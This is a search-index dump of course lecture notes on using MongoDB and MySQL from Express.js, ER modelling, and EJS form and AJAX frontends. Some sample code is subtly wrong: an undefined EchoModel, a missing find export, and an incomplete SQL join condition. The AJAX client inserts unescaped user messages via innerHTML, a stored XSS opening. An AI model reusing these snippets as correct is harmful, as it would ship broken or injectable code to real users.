ISODate(\"2023-05-23T11:28:49.094Z\") }, { _id: ObjectId(\"646ca378f51912fe44f4c172\"), key: 2, msg: 'hello', time: ISODate(\"2023-05-23T11:28:56.387Z\") } ] We may also query documents with nested documents. echo> db.createCollection('user'); { ok: 1 } echo> db.user.insertOne({ 'id':1, 'name':'bob', 'dob': { 'year': 2001, 'month':12, 'day':25 } }); { acknowledged: true, insertedId: ObjectId(\"6476a12efb9207a944895017\") } echo> db.user.find( { 'dob.year' : { $eq : 2001 } } ) [ { _id: ObjectId(\"6476a12efb9207a944895017\"), id: 1, name: 'bob', dob: { year: 2001, month: 12, day: 25 } } ] Note that the find method returns a list of documents, we may use a cursor variable to iterate through the document list. echo> var cursor = db.message.find(); // note that var can be omitted here. echo> while (cursor.hasNext()) { printjson(cursor.next()); } { _id: ObjectId(\"646c7454389aceea398edc02\"), key: 1, msg: 'hello', time: ISODate(\"2023-05-23T08:07:48.172Z\") }, { _id: ObjectId(\"646c747a389aceea398edc03\"), key: 2, msg: 'hello', time: ISODate(\"2023-05-23T08:08:26.255Z\") } In the above, we call .find() to execute the query, the result list of documents is assigned to a cursor variable. The cursor in this context behaves similar to an iterator that found in Python and Java, i.e. we can use .hasNext() to check whether it has the next element, .next() to retrieve the next element incrementally. This allows us to scan through the set of results (which is potentially huge and not fitting in the RAM). To delete a set of documents meeting the criteria, we use the deleteMany method. echo> db.message.deleteMany({ 'key': { $eq: 2}}) For the full list of collection operations refer to https://www.mongodb.com/docs/manual/crud/ and https://www.mongodb.com/docs/manual/aggregation/","title":"Accessing MongoDB via Mongo Shell"},{"location":"notes/l5_1_expressjs_backend_mongo/#mongodb-as-a-db-in-an-expressjs-app","text":"Firstly, let's create a new project. mkdir my_mongo_app cd my_mongo_app npx express-generator --view=ejs npm i mongodb npm audit fix --force We should have a project whose structure is similar to the previous echo app. Copy the app.js and echo.js files from the last app over into the current app. Next we create a folder models under the project root folder. In the models folder, we create a file named db.js with the following content. const MongoClient = require('mongodb').MongoClient; // creating a user with a password to mongodb is recommended. const connection_str = 'mongodb://localhost:27017/'; const client = new MongoClient(connection_str); const dbName = 'echo' var db = null; try { db = client.db(dbName); } catch (error) { console.error(\"database connection failed. \" + error); } async function cleanup() { await client.disconnect(); } module.exports = { db, cleanup } ; In the above we initialize the connection string and estabalish a mongodb client connection. In addition, we define a cleanup() function which will be callled when the web app terminates. Then we modify the app.js by importing the ./models/db.js module, and the process module. const process = require('process'); var db = require('./models/db.js'); process.on('SIGINT', db.cleanup); process.on('SIGTERM', db.cleanup); We register the SIGINT (signal interupt) and the SIGTERM (signal terminate) events with the cleanup() function from the db.js module. Next we create a new file in the ./models/ folder with name message.js with the following content. const db = require('./db.js'); const collectionName = 'message' class Message { constructor(msg, time) { this.msg = msg; this.time = time; } } /** return all mesages */ async function all() { try { const collection = db.echo.collection(collectionName); const cursor = collection.find(); var messages = []; while (await cursor.hasNext()) { const dbobj = await cursor.next(); messages.push(new Message(dbobj.msg, dbobj.time)); } return messages; } catch(error) { console.error(\"database connection failed.\" + error); throw error; } } /** insert a list of messages */ async function insertMany( messages ) { try { const collection = db.echo.collection(collectionName); await collection.insertMany(messages); } catch(error) { console.error(\"database connection failed.\" + error); throw error; } } module.exports = { Message, all, find, insertMany } In this module, we import the db.js module, we define a class Message with two attributes. In addition, we define a query function all() that retrieves all messages, and an insertMany() function that inserts new documents into the the collection. Note that these functions are async as the underlying calls to the db are asynchronmous, i.e. producing promises. Finally, we modify the echo.js router to save the echod message and retrieve all the old messages. const model = require('../models/message.js'); router.get('/:msg', async function(req, res, next) { const msg = req.params.msg; const message = new model.Message(msg, new Date()); await EchoModel.insertMany([message]); const messages = await model.all(); res.send(`${JSON.stringify(messages)}`); });","title":"MongoDB as a DB in an Express.js app"},{"location":"notes/l5_1_expressjs_backend_mongo/#cohort-exercise","text":"Modify the echo router so that it will return the most recent 3 messages? Add an end point /echo/delete to the echo router to delete the oldest message.","title":"Cohort Exercise"},{"location":"notes/l5_1_expressjs_backend_mongo/#object-data-mapping","text":"In the above example, we incorporate the model layer to the web app. The models abstract away the underlying database operations in forms of function calls and class object instantiation. Alternatively, we could use the mongoose library to help us to generate some of these codes. You are encouraged to check out the mongoose library. https://mongoosejs.com/","title":"Object Data Mapping"},{"location":"notes/l5_1_expressjs_backend_mongo/#where-are-the-controllers","text":"So far we have not seen any controller in this project. We will define controller when we need to model complex business logic which involves multiple models, which is absent in this example.","title":"Where are the controllers?"},{"location":"notes/l5_1_expressjs_backend_mongo/#a-briefing-on-data-modelling","text":"In Software engineering, we often use UML model to formalize the system requirements. In Database design, we often use Entity Relation diagrams to formalize the data requirements of a system. This phase is also known as conceptual modelling in which we focus in identifying what data to store, rather than how to store the data. An ER Diagram may consists of some of the following Entity set. An entity set captures a set of objects or items to be stored. It is represented as a rectangular box with the entity name inside. Attribute. An attribute describe a property of an entity. An attribute is represented as an oval shape with the attribute name inside. Attribute serves as (part of) the primary key of the entity will be underlined. Relationship. A relationship defines the relationship between entities. It is represented as a diamond shape with the relationship name inside. Relationships are often annotated with cardinality constraints. We will discuss it shortly. For instance The above ER diagram, we find that Staff as an entity set. Each staff in this entity set should have two attributes, Sid and Name . Sid is the unique identifier for an entity object in a set. Let's consider another digram In the above ER diagram, we find another entity set Dept , which is identified by the Code attribute. There exists a relationship between Staff and Dept entity sets, i.e. Work . It implies that the database system should store the information of which staff is working in which department. The N and 1 annotating the connectors are known as the cardinality of the relationship. The 1 indicates that for each entity object in Staff there exists maximum 1 corresponding entity object in Dept . In plain English it means, a staff can work in only 1 department in maximum. The N denotes the fact that for each entity object in Dept there exists (infiniely) many corresponding entity objects in Staff . In plain English it means, a department may have many staff working inside. Let's consider another diagram In the above ER diagram, we find an additional relationship between the Staff and Dept , i.e. Manage which captures the fact that the database system should capture the information of the manager of each department. The 1 near the Dept means that each staff can only be the manager of maximum one department. The 1 next to the Staff means that each department has at most one manager.","title":"A Briefing on Data Modelling"},{"location":"notes/l5_1_expressjs_backend_mongo/#er-to-document","text":"Mapping the ER diagram to Mongo Database collection is to determine how the data should be stored. This phase is also known as logical modelling (and subsequently physical modelling). Let's consider the modelling the ER diagram with Staff and Dept and Work relationship (without the Manage relation). There are more than one possible logical models. Approach one. Storing Dept as a collection, which has attributes code and staffs . code is a string, staffs is a list of objects. Each object in staffs is a document with sid and name as attributes. e.g. json { 'code' : 'HR', 'staffs' : [ { 'id' : 1, 'name' : \"aaron\" }, { 'id' : 2, 'name' : \"betty\" } ] } Approach two. Storing Staff as a separate collection, and the staffs attribute in the department document should contains only the ids of the staff. A dept document json { 'code' : 'HR', 'staffs' : [ { 'id' : 1 }, { 'id' : 2 } ] } A staff document contains id , name and dept_code attributes. json { 'id': 1, 'name': 'aaron' 'dept_code': 'HR' } Both design will work. The advantage of the first approach is that all the information are now stored in one collection, it is easier to ensure the data consistency, while the downside is that as the conceptual model becomes complex, we might have documents with too many level of nesting. Approach two avoids the deep nesting of the document structure, however, to maintain the data consistency requires additional checking and validation in the application.","title":"ER to Document"},{"location":"notes/l5_1_expressjs_backend_mongo/#cohort-exercises","text":"Using MongoDB document example, can you give a logical design of the ER diagram with the Staff and Dept entities and Work and Manage relationships? Can you implement a web app with the correspondent end-point (routes) handlers to support 1. add and update staff 1. add dept 1. find staff s by department code 1. find staff s by staff id","title":"Cohort Exercises"},{"location":"notes/l5_1_expressjs_backend_mongo/#some-special-cases-of-er-diagrams","text":"There are some difficult cases of ER diagrams to be modeled in document database in general, For instance a ternery relationship below For simplicity, we omitted the attributes of the entities. In this design find that 1. Given an article and a book, we find only one publisher 1. Given an article and a publisher, we find only one book, 1. Given a publisher and a book, there are many articles inside. Another example is the self-loop relationship below 1. A staff can be the Reporting Officer of many other staffs 2. A staff can be the Subordinate of only one managing staff. Implementing these designs often require us to have flat document structures.","title":"Some special cases of ER diagrams"},{"location":"notes/l5_2_mysql/","text":"50.003 - Express.js and MySQL Learning Outcomes By the end of this unit, you should be able to Use MySQL to manage a relational database Integrate the restful API with MySQL as the database. Use view to present user requested information Use AJAX and JSON end-points to present user requested information Relational Databases From the previous unit, we learn that Relational Database is an alternative to provide a logical model (and physical model) to a database design. Relational Database, informally speaking, represent data in terms of relations (or tables). A table is a set of records that have the same set of attributes. For instance, given the ER diagram We could represent the staff entity as a table | id | name | |---|---| | 1 | aaron | | 2 | betty | id is the primary key reprsent the dept entity as a table | code | |---| | HR| code is the primary key. represent the Work relationship as a table | id | code | |---|---| | 1 | HR| | 2 | HR| id and code together form the primary key. represent the Manage relationship as a table | id | code | |---|---| | 2 | HR | either id or code can be the primary key. Sometimes, we just represent the above using a simpler schema representation for documentation purposes. * staff( id , name) * dept( code ) * work( id, code ) * manage(id, code ) Next let's implement the above logical design using MySQL MySQL To install MySQL, If you are using windows or Mac, you can download and install from url https://dev.mysql.com/downloads/mysql/ If you are using Ubuntu or Ubuntu subsystem in Windows ```bash sudo apt install mysql-server ```` To create a database in MySQL, we use the mysql client shell sudo mysql Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement. mysql> create database staffdir; Query OK, 1 row affected (0.04 sec) mysql> use staffdir; Database changed mysql> In the above we login to the mysql client as the root user. In the MySQL Shell, we create a databse name staffdir . We then use use commnad to switch the current working database to staffdir . Data Definition Language As a standard option for SQL compatible database, MySQL offers a subset of the language to enable the user to define the database tables, AKA Data Definition Language. First let's create the staff table and the dept table CREATE TABLE staff( id INTEGER PRIMARY KEY, name VARCHAR(255) ); CREATE TABLE dept( code CHAR(2) PRIMARY KEY ); The create table statement specifies the table name (preceding the paranthesis), and the attributes (inbetewen the parenthesis). We have to define the type of the attribute, INTEGER as integer, VARCHAR(255) as a variable length character array with max length 255. In addition, we specify the primary key using the PRIMRAY KEY keyword. Note that SQL statements are case insensitive. Next we consider the tables for the two relationships, CREATE TABLE work( id INTEGER, code CHAR(2), PRIMARY KEY (id, code), FOREIGN KEY (id) REFERENCES staff(id), FOREIGN KEY (code) REFERENCES dept(code) ); CREATE TABLE manage( id INTEGER UNIQUE, code CHAR(2) PRIMARY KEY, FOREIGN KEY (id) REFERENCES staff(id), FOREIGN KEY (code) REFERENCES dept(code) ); Since the attribtues of the work table (similarly, manage ) are dependent on those defined in the entities tables, namely staff and dept . There must be some kind of integerity checking to be done by the database. The FOREIGN KEY key word specify that id in work must be an existing id in staff table. Similar obsevation applies ot the code attribute. The database will return an error if a record with id not existing in staff being inserted into work . a record with id used work being deleted from staff . ... To drop a table, we can use a DROP TABLE statement DROP TABLE manage; For the full set of DDL operations for MySQL, https://dev.mysql.com/doc/refman/8.0/en/innodb-online-ddl-operations.html Data Manipulation Language To insert records into the tables, we use the INSERT statements INSERT INTO staff (id, name) VALUES (1, \"aaron\"), (2, \"betty\"); INSERT INTO dept (code) VALUES (\"HR\"); INSERT INTO work (id, code) VALUES (1, \"HR\"), (2, \"HR\"); INSERT INTO manage (id, code) VALUES (2, \"HR\"); To retrieve the records from a table, we use the SELECT statement For instance SELECT * FROM work; returns the list of records ( id and code ) in the work table. The query below SELECT id FROM work where code = \"HR\"; returns the list of staff id from the HR department. The query below -- find all names of staff who are working in the HR department SELECT staff.name FROM work INNER JOIN staff ON work.id WHERE work.code = \"HR\"; finds the list of staff names from the HR department. We can also perform aggregation. SELECT count(id), code FROM work GROUP BY code; finds the number of staff for each department. To update a set of records in a table, we use the UPDATE statement. For example the following statement change the name of staff with id = 2 to \"beatrice\". UPDATE staff SET name = \"beatrice\" WHERE id = 2; To delete a set of records in a table, we use the DELETE statement. DELETE FROM manage WHERE code = \"HR\"; Express.js with MySQL Let's create a similar project structure mkdir my_mysql_app cd my_mysql_app npx express-generator --view=ejs npm i npm i mysql2 Next login to mysql client shell and create a database and a databse user; CREATE DATABASE echo; CREATE USER 'pichu'@'localhost' IDENTIFIED BY 'pikaP!'; -- we may replace % by hostname/ip to restrict the access GRANT ALL PRIVILEGES ON echo.* TO 'pichu'@'localhost'; FLUSH PRIVILEGES; The first statement creates a database named echo . The second statement create a database user with name pichu located at the localhost with password as pikaP! . The third statement grants all the privileges on the echo database to this user. The last statement ensure all the privilege updates are written to the disk. Go to the express.js project root folder, namely my_mysql_app , create a sub folder with name models . In folder models , create a db.js file with the following content. const mysql = require('mysql2') let pool = mysql .createPool({ host: \"localhost\", user: \"pichu\", database: \"echo\", password: \"pikaP!\", connectionLimit: 10, }) .promise(); async function cleanup() { await pool.end(); } module.exports = {pool, cleanup}; In the second statement, we create a connection pool to the mysql database. A connection pool allows us to regular the resource usage for database operations. The rest are similar to the one we learned using mongodb. Next in the same folder ( models ), create a file named message.js with the following content. const db = require('./db.js'); const tableName = 'message'; class Message { constructor(msg, time) { this.msg = msg; this.time = time; } } async function sync() { try { db.pool.query(` CREATE TABLE IF NOT EXISTS ${tableName} ( msg VARCHAR(255), time DATETIME PRIMARY KEY ) `); } catch (error) { console.error(\"database connection failed. \" + error); throw error; } } async function all() { try { const [rows, fieldDefs] = await db.pool.query(` SELECT msg, time FROM ${tableName} `); var list = []; for (let row of rows) { let message = new Message(row.msg, row.time); list.push(message); } return list; } catch (error) { console.error(\"database connection failed. \" + error); throw error; } } async function insertOne(message) { try { const [rows, fieldDefs] = await db.pool.query(` INSERT INTO ${tableName} (msg, time) VALUES (?, ?) `, [message.msg, message.time]); } catch (error) { console.error(\"database connection failed. \" + error); throw error; } } async function insertMany(messages) { for (let message of messages) { await insertOne(message); } } module.exports = { Message, all, sync, insertOne, insertMany } Similar to how my_mongo_app , we define a class Message to model each message received and saved. MySQL data must be stored in a table with schema definition. We define a sync function which creates the table in the database if it is not there. This function will be called in the app.js when the web app starts. We provide a set of functions. Function all retrieves all the messages from the table. Function insertOne inserts a message using the INSERT statement. In this case we find two ? s in the statement, these two question marks are the placeholders for the verified values. In this case message.msg and message.time will be subsituted in the statement if they are valid. The mysql2 library will verify that the values substituting ? do not contain illegal characters which might cause some security issues, (which will be discussed in some class later). Function insertMany inserts a list of messages. Next we create a routes/echo.js file with the following content, const express = require('express'); const model = require('../models/message.js'); var router = express.Router(); /* GET echo listing. */ router.get('/:msg', async function(req, res, next) { const msg = req.params.msg; const message = new model.Message(msg, new Date()); await model.insertMany([message]); const messages = await model.all(); console.log(messages); res.send(`${JSON.stringify(messages)}`); }); module.exports = router; which is similar to what we have seen in the my_mongo_app . Finally, in the app.js file, we include the following var logger = require('morgan'); // adding the following const db = require('./models/db.js'); const process = require('process'); process.on('SIGINT', db.cleanup); process.on('SIGTERM', db.cleanup); const message = require('./models/message.js'); message.sync(); // end We imported the db.js file we created and process library so that we can register the db.cleanup function as the callback when the web app terminates. We also imported the message model module so that we can call message.sync() to make sure the table exists. Finally we add the following to app.js so that we can call the echo router on the URL path /echo . app.use('/echo', echoRouter); Exercise (Not Graded) Can you modify the echo router so that it will return the most recent 3 messages? In the above example, we incorporate the model layer to the web app. The models abstract away the underlying database operations in forms of function calls and class object instantiation. Alternatively, we could use the sequelize library to help us to generate some of these codes. You are encouraged to check out the sequelize library. https://sequelize.org/","title":"50.003 - Express.js and MySQL"},{"location":"notes/l5_2_mysql/#50003-expressjs-and-mysql","text":"","title":"50.003 - Express.js and MySQL"},{"location":"notes/l5_2_mysql/#learning-outcomes","text":"By the end of this unit, you should be able to Use MySQL to manage a relational database Integrate the restful API with MySQL as the database. Use view to present user requested information Use AJAX and JSON end-points to present user requested information","title":"Learning Outcomes"},{"location":"notes/l5_2_mysql/#relational-databases","text":"From the previous unit, we learn that Relational Database is an alternative to provide a logical model (and physical model) to a database design. Relational Database, informally speaking, represent data in terms of relations (or tables). A table is a set of records that have the same set of attributes. For instance, given the ER diagram We could represent the staff entity as a table | id | name | |---|---| | 1 | aaron | | 2 | betty | id is the primary key reprsent the dept entity as a table | code | |---| | HR| code is the primary key. represent the Work relationship as a table | id | code | |---|---| | 1 | HR| | 2 | HR| id and code together form the primary key. represent the Manage relationship as a table | id | code | |---|---| | 2 | HR | either id or code can be the primary key. Sometimes, we just represent the above using a simpler schema representation for documentation purposes. * staff( id , name) * dept( code ) * work( id, code ) * manage(id, code ) Next let's implement the above logical design using MySQL","title":"Relational Databases"},{"location":"notes/l5_2_mysql/#mysql","text":"To install MySQL, If you are using windows or Mac, you can download and install from url https://dev.mysql.com/downloads/mysql/ If you are using Ubuntu or Ubuntu subsystem in Windows ```bash sudo apt install mysql-server ```` To create a database in MySQL, we use the mysql client shell sudo mysql Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement. mysql> create database staffdir; Query OK, 1 row affected (0.04 sec) mysql> use staffdir; Database changed mysql> In the above we login to the mysql client as the root user. In the MySQL Shell, we create a databse name staffdir . We then use use commnad to switch the current working database to staffdir .","title":"MySQL"},{"location":"notes/l5_2_mysql/#data-definition-language","text":"As a standard option for SQL compatible database, MySQL offers a subset of the language to enable the user to define the database tables, AKA Data Definition Language. First let's create the staff table and the dept table CREATE TABLE staff( id INTEGER PRIMARY KEY, name VARCHAR(255) ); CREATE TABLE dept( code CHAR(2) PRIMARY KEY ); The create table statement specifies the table name (preceding the paranthesis), and the attributes (inbetewen the parenthesis). We have to define the type of the attribute, INTEGER as integer, VARCHAR(255) as a variable length character array with max length 255. In addition, we specify the primary key using the PRIMRAY KEY keyword. Note that SQL statements are case insensitive. Next we consider the tables for the two relationships, CREATE TABLE work( id INTEGER, code CHAR(2), PRIMARY KEY (id, code), FOREIGN KEY (id) REFERENCES staff(id), FOREIGN KEY (code) REFERENCES dept(code) ); CREATE TABLE manage( id INTEGER UNIQUE, code CHAR(2) PRIMARY KEY, FOREIGN KEY (id) REFERENCES staff(id), FOREIGN KEY (code) REFERENCES dept(code) ); Since the attribtues of the work table (similarly, manage ) are dependent on those defined in the entities tables, namely staff and dept . There must be some kind of integerity checking to be done by the database. The FOREIGN KEY key word specify that id in work must be an existing id in staff table. Similar obsevation applies ot the code attribute. The database will return an error if a record with id not existing in staff being inserted into work . a record with id used work being deleted from staff . ... To drop a table, we can use a DROP TABLE statement DROP TABLE manage; For the full set of DDL operations for MySQL, https://dev.mysql.com/doc/refman/8.0/en/innodb-online-ddl-operations.html","title":"Data Definition Language"},{"location":"notes/l5_2_mysql/#data-manipulation-language","text":"To insert records into the tables, we use the INSERT statements INSERT INTO staff (id, name) VALUES (1, \"aaron\"), (2, \"betty\"); INSERT INTO dept (code) VALUES (\"HR\"); INSERT INTO work (id, code) VALUES (1, \"HR\"), (2, \"HR\"); INSERT INTO manage (id, code) VALUES (2, \"HR\"); To retrieve the records from a table, we use the SELECT statement For instance SELECT * FROM work; returns the list of records ( id and code ) in the work table. The query below SELECT id FROM work where code = \"HR\"; returns the list of staff id from the HR department. The query below -- find all names of staff who are working in the HR department SELECT staff.name FROM work INNER JOIN staff ON work.id WHERE work.code = \"HR\"; finds the list of staff names from the HR department. We can also perform aggregation. SELECT count(id), code FROM work GROUP BY code; finds the number of staff for each department. To update a set of records in a table, we use the UPDATE statement. For example the following statement change the name of staff with id = 2 to \"beatrice\". UPDATE staff SET name = \"beatrice\" WHERE id = 2; To delete a set of records in a table, we use the DELETE statement. DELETE FROM manage WHERE code = \"HR\";","title":"Data Manipulation Language"},{"location":"notes/l5_2_mysql/#expressjs-with-mysql","text":"Let's create a similar project structure mkdir my_mysql_app cd my_mysql_app npx express-generator --view=ejs npm i npm i mysql2 Next login to mysql client shell and create a database and a databse user; CREATE DATABASE echo; CREATE USER 'pichu'@'localhost' IDENTIFIED BY 'pikaP!'; -- we may replace % by hostname/ip to restrict the access GRANT ALL PRIVILEGES ON echo.* TO 'pichu'@'localhost'; FLUSH PRIVILEGES; The first statement creates a database named echo . The second statement create a database user with name pichu located at the localhost with password as pikaP! . The third statement grants all the privileges on the echo database to this user. The last statement ensure all the privilege updates are written to the disk. Go to the express.js project root folder, namely my_mysql_app , create a sub folder with name models . In folder models , create a db.js file with the following content. const mysql = require('mysql2') let pool = mysql .createPool({ host: \"localhost\", user: \"pichu\", database: \"echo\", password: \"pikaP!\", connectionLimit: 10, }) .promise(); async function cleanup() { await pool.end(); } module.exports = {pool, cleanup}; In the second statement, we create a connection pool to the mysql database. A connection pool allows us to regular the resource usage for database operations. The rest are similar to the one we learned using mongodb. Next in the same folder ( models ), create a file named message.js with the following content. const db = require('./db.js'); const tableName = 'message'; class Message { constructor(msg, time) { this.msg = msg; this.time = time; } } async function sync() { try { db.pool.query(` CREATE TABLE IF NOT EXISTS ${tableName} ( msg VARCHAR(255), time DATETIME PRIMARY KEY ) `); } catch (error) { console.error(\"database connection failed. \" + error); throw error; } } async function all() { try { const [rows, fieldDefs] = await db.pool.query(` SELECT msg, time FROM ${tableName} `); var list = []; for (let row of rows) { let message = new Message(row.msg, row.time); list.push(message); } return list; } catch (error) { console.error(\"database connection failed. \" + error); throw error; } } async function insertOne(message) { try { const [rows, fieldDefs] = await db.pool.query(` INSERT INTO ${tableName} (msg, time) VALUES (?, ?) `, [message.msg, message.time]); } catch (error) { console.error(\"database connection failed. \" + error); throw error; } } async function insertMany(messages) { for (let message of messages) { await insertOne(message); } } module.exports = { Message, all, sync, insertOne, insertMany } Similar to how my_mongo_app , we define a class Message to model each message received and saved. MySQL data must be stored in a table with schema definition. We define a sync function which creates the table in the database if it is not there. This function will be called in the app.js when the web app starts. We provide a set of functions. Function all retrieves all the messages from the table. Function insertOne inserts a message using the INSERT statement. In this case we find two ? s in the statement, these two question marks are the placeholders for the verified values. In this case message.msg and message.time will be subsituted in the statement if they are valid. The mysql2 library will verify that the values substituting ? do not contain illegal characters which might cause some security issues, (which will be discussed in some class later). Function insertMany inserts a list of messages. Next we create a routes/echo.js file with the following content, const express = require('express'); const model = require('../models/message.js'); var router = express.Router(); /* GET echo listing. */ router.get('/:msg', async function(req, res, next) { const msg = req.params.msg; const message = new model.Message(msg, new Date()); await model.insertMany([message]); const messages = await model.all(); console.log(messages); res.send(`${JSON.stringify(messages)}`); }); module.exports = router; which is similar to what we have seen in the my_mongo_app . Finally, in the app.js file, we include the following var logger = require('morgan'); // adding the following const db = require('./models/db.js'); const process = require('process'); process.on('SIGINT', db.cleanup); process.on('SIGTERM', db.cleanup); const message = require('./models/message.js'); message.sync(); // end We imported the db.js file we created and process library so that we can register the db.cleanup function as the callback when the web app terminates. We also imported the message model module so that we can call message.sync() to make sure the table exists. Finally we add the following to app.js so that we can call the echo router on the URL path /echo . app.use('/echo', echoRouter);","title":"Express.js with MySQL"},{"location":"notes/l5_2_mysql/#exercise-not-graded","text":"Can you modify the echo router so that it will return the most recent 3 messages? In the above example, we incorporate the model layer to the web app. The models abstract away the underlying database operations in forms of function calls and class object instantiation. Alternatively, we could use the sequelize library to help us to generate some of these codes. You are encouraged to check out the sequelize library. https://sequelize.org/","title":"Exercise (Not Graded)"},{"location":"notes/l6_1_expressjs_frontend/","text":"50.003 - Express.js Frontend View and JQuery Learning Outcomes By the end of this unit, you should be able to Develop web app frontend using HTML Form Develop web app frontend using AJAX This is unit, we study the different approaches of developing frontend components of a web application. Recall that the View modules in a MVC model are dedicated to handle user inputs and renders the requested results. View Let's take our echo app as example, when we visit https://localhost:3000/ The web app is triggering the following route in the routes/index.js . /* GET home page. */ router.get('/', function(req, res, next) { res.render('index', { title: 'Express' }); }); In the above we call res.render() which takes two parameters. 1. index , the view template, ( ./views/index.ejs ). 2. An object { title: 'Express'} . it passes the object to the view template <!DOCTYPE html> <html> <head> <title><%= title %></title> <link rel='stylesheet' href='/stylesheets/style.css' /> </head> <body> <h1><%= title %></h1> <p>Welcome to <%= title %></p> </body> </html> Note that in the view template, we are using mostly HTML syntax, except that we have some special tagged element <%= title %> which are the place-holders for the data to displayed. When res.render() is called with the view template and the object, the value associated with title , i.e. Express is being substituted to the tagged elements. As result, the following will be rendered on the client browser, <!DOCTYPE html> <html> <head> <title>Express</title> <link rel='stylesheet' href='/stylesheets/style.css' /> </head> <body> <h1>Express</h1> <p>Welcome to Express</p> </body> </html> Exercise Change the value Express in the object to Echo App , restart the app and see the change. Adding View to the Echo App Let's create a template in views/ named echo.ejs , with the following <!DOCTYPE html> <html> <head> <title><%= title %></title> <link rel='stylesheet' href='/stylesheets/style.css' /> </head> <body> <div>Enter Your Message:</div> <div><input id=\"message\" type=\"text\"/> </div> <div><input id=\"sendButton\" type=\"button\" value=\"Send\"/></div> </body> </html> Next we modify the routes/echo.js by inserting the following code snippet before the export statement. router.get('/', function(req, res, next) { res.render(`echo`, { 'title': \"Echo App\"}); }) Now if we launch our web app, and open the link http://localhost:3000/echo/ we should see a page with a text label, a text field input and a button. But clicking on the button renders no effect. There are at least two ways to add the effect of clicking the Send button and sending the message to the database. Approach 1: using a form For now let's go with the approach which involves a form Duplicate the template echo.ejs into another file echoform.ejs , with the following adjustment <!DOCTYPE html> <html> <head> <title><%= title %></title> <link rel='stylesheet' href='/stylesheets/style.css' /> </head> <body> <form action=\"/echo/submit\" method=\"post\"> <div>Enter Your Message:</div> <div><input id=\"message\" name=\"message\" type=\"text\"/> </div> <div><input type=\"submit\" value=\"Send\"/></div> </form> <ol> <% for (var i = 0; i < messages.length; i++) { %> <li> <div><%=messages[i].time%></div><div><%=messages[i].msg%></div> </li> <% } %> </ol> </body> </html> First we wrapped the 3 div elements in the body with a form tag. A HTML form capture the inputs from its child elements and converts into a form, where each input value is assocated with a name. Thus in the input text element, we added a name attribute message . For the button, we changed its type from button to submit to indicate that when this button is clicked the form should be submitted. The action attribute of the form element indicate the destination of the end point, the method is HTTP POST. Below the form, we have an HTML order list element ol , whose content will be generated via the embedded javscript template language. In this case, we expect that the route handler will return an object containing a title and a messages list. By using a for loop, we expand the list of messages into a sequence of list items li . Within each li element, we render the message's time and text. Next we update the routes/echo.js as follows const express = require('express'); // existing const model = require('../models/message.js'); // existing var router = express.Router(); // existing /* GET echo listing. */ router.get('/:msg', async function(req, res, next) { // existing const msg = req.params.msg; const message = new model.Message(msg, new Date()); await model.insertMany([message]); const messages = await model.all(); console.log(messages); res.send(`${JSON.stringify(messages)}`); }); router.get('/', async function(req, res, next) { // updated const messages = await model.all(); res.render(`echoform`, { 'title': \"Echo App\",'messages': messages}); }); router.post('/submit', async function(req, res, next) { // new const msg = req.body.message; const message = new model.Message(msg, new Date()); await model.insertMany([message]); const messages = await model.all(); console.log(messages); res.render(`echoform`, { 'title': \"Echo App\", 'messages': messages}); }); module.exports = router; // existing In the second routing rule, we listen to the local URL path /echo/ , and retrieve all the messags, and render the result in the echoform template. This is to handle user accessing http://localhost:3000/echo In the third routing rule, we liste ot the local URL path /echo/submit over HTTP POST, we retrieve the message (via element name attribute = \"message\"), create a new message, retrieve all the messages from the model and render the result in the echoform template. Being different from HTTP GET, parameters of the requests submited via HTTP POST are packaged into the body of the request instead of being exposed as part of the URL. Technically speaking, users can't access a HTTP POST endpoint directly via the browser URL links or navigation bar. To allow the form data embeded in the HTTP POST request to be parsed, we add the following to the app.js const bodyParser = require('body-parser'); // new app.use(bodyParser.urlencoded({ extended: true })); // new app.use('/', indexRouter); // existing app.use('/users', usersRouter) // existing Approach 2 Using AJAX The advantage of Approach 1 is that it is relatively simple to implement and codes are pretty structured. One issue with Approach 1 is that the page echoform is reloaded each time we submit a new message. This is not a big deal when the page is simple with little content. It affects the user experience as the content of the page get complex and a single click would cause the entire page to refresh. To address this issue, we could use AJAX. The idea of AJAX is to divide the view template HTML into sub regions, when a user input is detected, we use the client side javascript to update the affected sub region. We re-start from the point of echo.ejs template again. We copy and modify its content into a new template echoajax.ejs <!DOCTYPE html> <html> <head> <title><%= title %></title> <script src='/javascripts/echoajaxclient.js'> </script> <link rel='stylesheet' href='/stylesheets/style.css' /> </head> <body> <div>Enter Your Message:</div> <div><input id=\"message\" type=\"text\"/> </div> <div><input id=\"sendButton\" type=\"button\" value=\"Send\"/></div> <ol id=\"messagesregion\"> </ol> </body> </html> Note that only change we introduce is the div element with id messagesregion and the inclusion of the client side javascript echoajaxclient . Next we add echoajaxclient.js file into the subfolder public/javascripts/ . // update the ol with id = \"messagesregion\" in the curent page // input: json contains list of messages // output : none function update_messagesregion(json) { var html = \"\"; for (let i = 0; i < json.length; i++) { const message = json[i]; html += `<li><div>${message.time}</div><div>${message.msg}</div></li>`; } var region = document.getElementById(\"messagesregion\"); region.innerHTML = html; } function handleSendButtonClick() { var message = document.getElementById(\"message\"); var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function() { if (xhr.readyState == 4) { var res = xhr.responseText; var json = JSON.parse(res); update_messagesregion(json); } }; // constructing a HTTP POST request var params = `msg=${message.value}`; xhr.open('POST', `/echo/submit/`, true); //Send the proper header information along with the request xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); xhr.send(params); } // set up the event listener for the send button // call /echo/all to get the current list of messages function run() { var sendButton = document.getElementById(\"sendButton\"); sendButton.addEventListener(\"click\", handleSendButtonClick); var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function () { if (xhr.readyState == 4) { var res = xhr.responseText; var json = JSON.parse(res); update_messagesregion(json); } } xhr.open('GET', `/echo/all`); xhr.send(); } document.addEventListener( \"DOMContentLoaded\", run); In the above client side javascript, we call function run when the HTML document is fully rendered. Function run performs two tasks register a call back function handleSendButtonClick to the event of sendButton being click. make an API call to the /echo/all end point to get the list of messages and render it in the messagesregion ordered list. Function handleSendButtonClick is triggered when the button is clicked, it retrieves the value from the input text box and submit an HTTP POST request to the /echo/submit end point to add the message, then extract the lst of messages from the response and render it. We adjust the routes/echo.js with the following routing rules. router.get('/', async function(req, res, next) { res.render(`echoajax`, { 'title': \"Echo App\"}); }); router.get('/all', async function(req, res, next) { const messages = await model.all(); res.send(`${JSON.stringify(messages)}`); }); router.post('/submit/', async function(req, res, next) { const msg = req.body.msg; const message = new model.Message(msg, new Date()); await model.insertMany([message]); const messages = await model.all(); 